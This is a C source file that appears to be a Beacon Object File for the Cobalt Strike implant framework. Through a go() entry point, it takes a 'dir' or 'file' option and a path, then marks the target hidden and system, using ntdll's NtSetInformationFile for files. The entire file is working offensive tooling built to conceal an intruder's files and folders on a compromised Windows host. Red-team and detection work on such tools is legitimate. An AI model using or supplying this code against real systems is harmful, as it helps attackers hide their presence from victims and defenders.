#include <windows.h>
#include <stdio.h>
#include "hidefile.h"
#include "beacon.h"


BOOL CreateHiddenDir(WCHAR *directory) {
	DWORD attrib;
	attrib = KERNEL32$GetFileAttributesW(directory);
	if(attrib == INVALID_FILE_ATTRIBUTES) {
		BeaconPrintf(CALLBACK_ERROR, "Failed to get file attribute information from directory with error code: %ld. Is the path and directory name correct?\n", KERNEL32$GetLastError());
		return FALSE;
	}
	attrib |= FILE_ATTRIBUTE_HIDDEN;
	attrib |= FILE_ATTRIBUTE_SYSTEM;

	if(KERNEL32$SetFileAttributesW(directory, attrib) == 0) {
		BeaconPrintf(CALLBACK_ERROR, "Failed to set new attribute information on the directory with error code: %ld\n", KERNEL32$GetLastError());
		return FALSE;
	}
	return TRUE;
}


BOOL CreateHiddenFile(WCHAR *file) {
	HANDLE hFile;
	FILE_BASIC_INFORMATION fileInfo;
	IO_STATUS_BLOCK ioStatusBlock;
	

	NtQueryInformationFile_t pNtQueryInformationFile = (NtQueryInformationFile_t)GetProcAddress(GetModuleHandle("ntdll.dll"), "NtQueryInformationFile");
	if(pNtQueryInformationFile == NULL) return 0;

    NtSetInformationFile_t pNtSetInformationFile = (NtSetInformationFile_t)GetProcAddress(GetModuleHandle("ntdll.dll"), "NtSetInformationFile");
	if(pNtSetInformationFile == NULL) return 0;


	hFile = KERNEL32$CreateFileW(file, GENERIC_READ | GENERIC_WRITE | FILE_WRITE_ATTRIBUTES, 0, NULL, OPEN_EXISTING, 0, NULL);
	if (hFile == INVALID_HANDLE_VALUE) {
		BeaconPrintf(CALLBACK_ERROR, "Could not open file with error code: %ld\n", KERNEL32$GetLastError());
		return FALSE;
	}

	if (pNtQueryInformationFile(hFile, &ioStatusBlock, &fileInfo, sizeof(FILE_BASIC_INFORMATION), FileBasicInformation) < 0) {
		BeaconPrintf(CALLBACK_ERROR, "Failed to get file attribute information with error code: %ld\n", KERNEL32$GetLastError());
		KERNEL32$CloseHandle(hFile);
		return FALSE;
	}
	
	fileInfo.FileAttributes |= FILE_ATTRIBUTE_HIDDEN;
	fileInfo.FileAttributes |= FILE_ATTRIBUTE_SYSTEM;
	

	if (pNtSetInformationFile(hFile, &ioStatusBlock, &fileInfo, sizeof(FILE_BASIC_INFORMATION), FileBasicInformation) < 0) {
		BeaconPrintf(CALLBACK_ERROR, "Failed to set new attribute information on the file with error code: %ld\n", KERNEL32$GetLastError());
		KERNEL32$CloseHandle(hFile);
		return FALSE;
	}

	KERNEL32$CloseHandle(hFile);
	return TRUE;
}


int go(char *args, int len) {
	CHAR *option;
	WCHAR *path;
	BOOL res = FALSE;
	datap parser;
	
	BeaconDataParse(&parser, args, len);
	option = BeaconDataExtract(&parser, NULL);
	path = BeaconDataExtract(&parser, NULL);
	
	if (MSVCRT$strcmp(option, "dir") == 0) {
		res = CreateHiddenDir(path);
		if (res) BeaconPrintf(CALLBACK_OUTPUT, "[+] Successfully modified directory attributes to systemfile + hidden.\n");
	}
	else if (MSVCRT$strcmp(option, "file") == 0) {
		res = CreateHiddenFile(path);
		if (res) BeaconPrintf(CALLBACK_OUTPUT, "[+] Successfully modified file attributes to systemfile + hidden.\n");
	}
	else BeaconPrintf(CALLBACK_ERROR, "Please specify one of the following options: dir | file\n");

	return 0;
}
